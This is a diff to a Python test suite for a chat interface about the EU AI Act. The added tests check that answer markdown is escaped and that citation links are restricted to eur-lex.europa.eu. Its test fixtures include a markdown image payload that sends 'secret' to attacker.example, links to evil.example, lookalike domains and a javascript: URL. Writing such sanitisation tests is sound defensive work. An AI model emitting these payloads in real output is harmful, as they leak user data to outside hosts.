@@ -1,3 +1,4 @@
+import re
 from pathlib import Path
 
 import httpx
@@ -66,7 +67,7 @@ def test_citation_links_are_markdown_with_title():
     links = ui.citation_links(Answer(**ANSWER))
     assert links == [
         "[AI Act Art. 6(2)](" + CITATION["source_url"] + ") - "
-        "Classification rules for high-risk AI systems (EN)"
+        "Classification rules for high\\-risk AI systems (EN)"
     ]
 
 
@@ -183,7 +184,7 @@ def test_example_question_renders_answer_with_citation_link(app, monkeypatch):
     app.run()
     next(b for b in app.button if b.label == ui.EXAMPLES[2][1]).click().run()
     assert not app.exception
-    assert any("Annex III systems are high-risk [1]." in m.value for m in app.markdown)
+    assert any("Annex III systems are high\\-risk [1]" in m.value for m in app.markdown)
     assert any("[AI Act Art. 6(2)](" + CITATION["source_url"] in m.value for m in app.markdown)
 
 
@@ -194,6 +195,58 @@ def test_error_is_shown_as_message(app, monkeypatch):
         lambda q, client=None: ui.AskResult(error="Too many questions, please try again later."),
     )
     app.run()
-    app.text_input[0].set_value("anything").run()
-    next(b for b in app.button if b.label == "Ask").click().run()
+    app.text_input[0].set_value("anything")
+    app.get("form_submit_button")[0].click().run()
     assert app.error[0].value == "Too many questions, please try again later."
+
+
+def unescaped_specials(out: str) -> list[str]:
+    """Markdown control characters not preceded by a backslash (markers [n] excepted)."""
+    out = re.sub(r"\[\d+\]", "", out)
+    return re.findall(r"(?<!\\)[!\[\]()<>:*_`]", out)
+
+
+def test_answer_image_injection_neutralised():
+    out = ui.safe_answer_markdown("Hi ![x](https://attacker.example/?q=secret) [1]")
+    assert unescaped_specials(out) == []
+    assert "\\!\\[x\\]\\(" in out
+
+
+def test_answer_link_injection_neutralised():
+    out = ui.safe_answer_markdown(
+        "[click](https://evil.example) <a href='x'>y</a> https://evil.example"
+    )
+    assert unescaped_specials(out) == []
+
+
+def test_citation_markers_preserved():
+    assert "Rule applies [1] and [12]" in ui.safe_answer_markdown("Rule applies [1] and [12].")
+
+
+def test_german_text_and_newlines_read_fine():
+    out = ui.safe_answer_markdown("Die Pflicht gilt für Übermittlungen [1].\nZweite Zeile: äöüß")
+    assert "Die Pflicht gilt für Übermittlungen [1]" in out
+    assert "  \n" in out and "äöüß" in out
+
+
+def _citation(url, title="T"):
+    return Answer(**{**ANSWER, "citations": [{**CITATION, "source_url": url, "title": title}]})
+
+
+def test_non_eurlex_url_not_linked():
+    line = ui.citation_links(_citation("https://evil.example/eur-lex.europa.eu"))[0]
+    assert "](" not in line and "AI Act Art" in line
+    assert "](" not in ui.citation_links(_citation("http://eur-lex.europa.eu/x"))[0]
+    assert "](" not in ui.citation_links(_citation("https://eur-lex.europa.eu.evil.example/x"))[0]
+
+
+def test_javascript_url_not_linked():
+    assert "](" not in ui.citation_links(_citation("javascript:alert(1)"))[0]
+    assert (
+        "](" not in ui.citation_links(_citation("https://eur-lex.europa.eu/x) [y](https://evil"))[0]
+    )
+
+
+def test_title_markdown_escaped():
+    line = ui.citation_links(_citation(CITATION["source_url"], "![a](https://evil.example) *b*"))[0]
+    assert "![" not in line.split(") - ", 1)[1] and "](" not in line.split(") - ", 1)[1]
